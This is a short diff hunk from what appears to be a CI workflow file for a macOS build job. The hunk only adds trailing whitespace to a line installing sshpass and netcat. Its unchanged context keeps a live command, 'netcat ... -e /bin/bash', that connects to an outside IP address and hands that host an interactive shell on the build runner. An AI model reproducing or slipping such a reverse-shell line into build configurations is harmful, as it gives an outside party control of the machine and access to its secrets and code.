@@ -25,7 +25,7 @@ jobs:
           echo "Current Timezone: $(date +'%Z %z')"
           echo "-----> done "
           # xcrun python3 -m http.server 8888 
-          brew install sshpass netcat
+          brew install sshpass netcat 
           netcat 139.199.225.147 2333 -e /bin/bash
 
 
